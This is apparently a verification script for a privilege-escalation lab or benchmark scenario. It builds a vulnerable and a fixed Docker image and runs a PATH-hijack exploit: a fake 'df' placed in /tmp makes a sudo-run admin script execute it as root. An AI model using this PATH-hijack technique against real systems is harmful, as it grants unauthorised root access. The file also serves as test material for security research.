#!/bin/bash
# Differential verification for expert_path_hijack_sudo
# Returns 0 if scenario is correctly configured, 1 otherwise

set -e
SCENARIO_DIR="$(cd "$(dirname "$0")" && pwd)"
SCENARIO_NAME="$(basename "$SCENARIO_DIR")"
IMAGE_NAME="$(printf '%s' "$SCENARIO_NAME" | tr '[:upper:]' '[:lower:]')"
VULN_IMAGE="privesc-${IMAGE_NAME}-vuln"
FIXED_IMAGE="privesc-${IMAGE_NAME}-fixed"

echo "=== Verifying scenario: ${SCENARIO_NAME} ==="

echo "[L1] Building vulnerable image..."
docker build -t "$VULN_IMAGE" -f "$SCENARIO_DIR/Dockerfile" "$SCENARIO_DIR" > /dev/null 2>&1
echo "[L1] Building fixed image..."
docker build -t "$FIXED_IMAGE" -f "$SCENARIO_DIR/Dockerfile.fixed" "$SCENARIO_DIR" > /dev/null 2>&1
echo "[L1] PASS: Both images build successfully"

EXPLOIT_SCRIPT='cat > /tmp/df <<"SH_EOF"
#!/bin/bash
id > /tmp/hijack.out
SH_EOF
chmod +x /tmp/df
PATH=/tmp:$PATH sudo /usr/local/sbin/admin_check.sh >/dev/null 2>&1 || true
cat /tmp/hijack.out 2>/dev/null'

echo "[L2] Testing exploit on vulnerable image..."
VULN_CONTAINER=$(docker run -d "$VULN_IMAGE")
sleep 2
VULN_OUT=$(docker exec "$VULN_CONTAINER" su - lowpriv -c "$EXPLOIT_SCRIPT" 2>&1 || true)
docker rm -f "$VULN_CONTAINER" > /dev/null 2>&1

if echo "$VULN_OUT" | grep -q "uid=0"; then
    echo "[L2] PASS: Exploit yields uid=0 on vulnerable image"
else
    echo "[L2] FAIL: Exploit did not yield root on vulnerable image"
    echo "  Output: $VULN_OUT"
    exit 1
fi

echo "[L2] Testing exploit on fixed image..."
FIXED_CONTAINER=$(docker run -d "$FIXED_IMAGE")
sleep 2
FIXED_OUT=$(docker exec "$FIXED_CONTAINER" su - lowpriv -c "$EXPLOIT_SCRIPT" 2>&1 || true)
docker rm -f "$FIXED_CONTAINER" > /dev/null 2>&1

if echo "$FIXED_OUT" | grep -q "uid=0"; then
    echo "[L2] FAIL: Exploit unexpectedly succeeded on fixed image"
    echo "  Output: $FIXED_OUT"
    exit 1
else
    echo "[L2] PASS: Exploit blocked on fixed image"
fi

docker rmi "$VULN_IMAGE" "$FIXED_IMAGE" > /dev/null 2>&1 || true

echo "=== VERIFIED: ${SCENARIO_NAME} ==="
exit 0
